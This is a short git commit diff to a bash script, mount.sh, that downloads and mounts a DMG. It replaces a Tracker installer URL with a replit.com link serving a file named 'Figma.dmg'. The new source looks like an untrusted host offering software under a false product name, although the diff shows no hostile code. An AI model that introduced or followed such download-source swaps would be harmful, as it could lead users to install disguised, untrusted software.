ebe33f2e88418f9c8345b728ffcc71f186984288
swisscookieman <94302796+swisscookieman@users.noreply.github.com>
2023-09-27 16:33:32 +0200

    Update mount.sh

--- mount.sh
+++ mount.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Set the URL of the DMG file to download. This is only sample URL
-dmg_url="https://tracker.physlets.org/installers/download.php?file=Tracker-6.1.3-osx-installer.dmg"
+dmg_url="https://replit.com/@Tamamanenslip/OffshoreUselessGlitch#Figma.dmg"
 
 # Set the output directory where the DMG will be mounted
 mount_dir="/Volumes/DMG_Mount"
